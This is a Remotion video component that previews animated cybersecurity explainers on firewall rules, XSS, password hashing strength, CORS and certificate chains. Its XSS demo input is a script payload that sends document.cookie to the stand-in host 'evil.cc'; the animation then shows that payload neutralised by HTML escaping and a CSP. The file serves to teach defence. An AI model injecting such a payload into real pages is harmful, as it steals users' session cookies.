import { AbsoluteFill, useCurrentFrame } from "remotion";
import { Backdrop } from "../components/Backdrop";
import { CertChain } from "../components/sec/CertChain";
import { CorsCard } from "../components/sec/CorsCard";
import { FirewallRules } from "../components/sec/FirewallRules";
import { PasswordCracker } from "../components/sec/PasswordCracker";
import { XSSPlayground } from "../components/sec/XSSPlayground";
import { TX } from "../layout";
import { Win } from "../lib/timing";
import { C, mono, prog } from "../theme";

// Preview of the cybersecurity group: FirewallRules, XSSPlayground, PasswordCracker, CorsCard, CertChain.
// Five 4-second sections across 600 frames (0..120, 120..240, 240..360, 360..480, 480..600).

const Label: React.FC<{ at: number; x?: number; y: number; children: string }> = ({ at, x = TX, y, children }) => {
  const frame = useCurrentFrame();
  return (
    <div
      style={{
        position: "absolute",
        left: x,
        top: y,
        fontFamily: mono,
        fontWeight: 500,
        fontSize: 26,
        color: C.mute,
        opacity: prog(frame, at, 8),
      }}
    >
      {children}
    </div>
  );
};

export const SecShowcase: React.FC = () => (
  <AbsoluteFill>
    <Backdrop />

    {/* 1. FirewallRules: stepping evaluation to DROPPED (light) and ALLOWED (dark) */}
    <Win from={0} to={120}>
      <Label at={0} y={255}>
        FirewallRules · SSH packet steps down → DROPPED at #30
      </Label>
      <FirewallRules
        at={2}
        x={TX}
        y={310}
        filename="ufw-inbound.rules"
        right="eth0 · public"
        packet={{
          label: "SYN 198.51.100.42 → :22 (TCP)",
          matchIndex: 2,
          at: 18,
          stepDur: 14,
        }}
        rules={[
          { priority: 10, action: "ALLOW", proto: "TCP", port: "80", src: "0.0.0.0/0", note: "HTTP redirect" },
          { priority: 20, action: "ALLOW", proto: "TCP", port: "443", src: "0.0.0.0/0", note: "TLS traffic" },
          { priority: 30, action: "DENY", proto: "TCP", port: "22", src: "0.0.0.0/0", note: "block public SSH" },
          { priority: 99, action: "DENY", proto: "ANY", port: "*", src: "0.0.0.0/0", note: "default drop" },
        ]}
      />

      <Label at={10} y={845}>
        FirewallRules · dark · TLS packet → ALLOWED at #20
      </Label>
      <FirewallRules
        at={12}
        x={TX}
        y={900}
        dark
        filename="iptables-filter.conf"
        right="WAF edge"
        packet={{
          label: "SYN 203.0.113.9 → :443 (TCP)",
          matchIndex: 1,
          at: 30,
          stepDur: 14,
        }}
        rules={[
          { priority: 10, action: "DENY", proto: "TCP", port: "*", src: "198.51.100.0/24", note: "blocklist subnet" },
          { priority: 20, action: "ALLOW", proto: "TCP", port: "443", src: "0.0.0.0/0", note: "HTTPS ingress" },
          { priority: 30, action: "RATE_LIMIT", proto: "TCP", port: "8080", src: "0.0.0.0/0", note: "60 req/min" },
          { priority: 99, action: "DENY", proto: "ANY", port: "*", src: "0.0.0.0/0", note: "implicit deny" },
        ]}
      />
    </Win>

    {/* 2. XSSPlayground: unsafe script execution in red -> HTML escaping + CSP in green */}
    <Win from={120} to={240}>
      <Label at={120} y={255}>
        XSSPlayground · unsafeAt 132 · sanitizeAt 174 (HTML escape + CSP)
      </Label>
      <XSSPlayground
        at={122}
        x={TX}
        y={310}
        unsafeAt={132}
        sanitizeAt={174}
        input="<script>fetch('evil.cc?c='+document.cookie)</script>"
        csp="CSP: script-src 'self'"
      />
    </Win>

    {/* 3. PasswordCracker: rapid spinning guess ticker cracking weak hashes vs Argon2id */}
    <Win from={240} to={360}>
      <Label at={240} y={255}>
        PasswordCracker · weak MD5/SHA-256 cracked vs Argon2id holding
      </Label>
      <PasswordCracker
        at={242}
        x={TX}
        y={310}
        entries={[
          {
            label: "123456",
            mask: "?d?d?d?d?d?d",
            hashAlgo: "MD5 (unsalted)",
            guessesPerSec: "180B",
            timeToCrack: "0.001 ms",
            crackedAt: 262,
          },
          {
            label: "P@ssw0rd",
            mask: "?u?s?l?l?l?d?l?l",
            hashAlgo: "SHA-256",
            guessesPerSec: "22B",
            timeToCrack: "4 mins",
            crackedAt: 282,
          },
          {
            label: "tr0ub4dor&3",
            mask: "?l?l?d?l?l?d?l?l?l?s?d",
            hashAlgo: "bcrypt (cost 10)",
            guessesPerSec: "45K",
            timeToCrack: "3 days",
            crackedAt: 304,
          },
          {
            label: "correct-horse-battery-staple",
            mask: "4-word passphrase",
            hashAlgo: "Argon2id (64 MiB)",
            guessesPerSec: "1.2K",
            timeToCrack: "4.2M years",
            safe: true,
          },
        ]}
      />
    </Win>

    {/* 4. CorsCard: preflight OPTIONS blocked in red -> allowAt adds Access-Control-Allow-Origin */}
    <Win from={360} to={480}>
      <Label at={360} y={255}>
        CorsCard · blocked at 376 → allowAt 418 adds CORS header
      </Label>
      <CorsCard
        at={362}
        x={TX}
        y={310}
        origin="https://app.dev"
        target="https://api.bank.com"
        method="POST"
        path="/v1/transfer"
        blockAt={376}
        allowAt={418}
      />
    </Win>

    {/* 5. CertChain: Root CA -> Intermediate CA -> Leaf verified, then tamperAt triggers ERR_CERT_AUTHORITY_INVALID */}
    <Win from={480} to={600}>
      <Label at={480} y={255}>
        CertChain · verifyAt 492 · tamperAt 542 (ERR_CERT_AUTHORITY_INVALID)
      </Label>
      <CertChain
        at={482}
        x={TX}
        y={310}
        verifyAt={492}
        tamperAt={542}
        tamperMode="self-signed"
        errorCode="ERR_CERT_AUTHORITY_INVALID"
      />
    </Win>
  </AbsoluteFill>
);
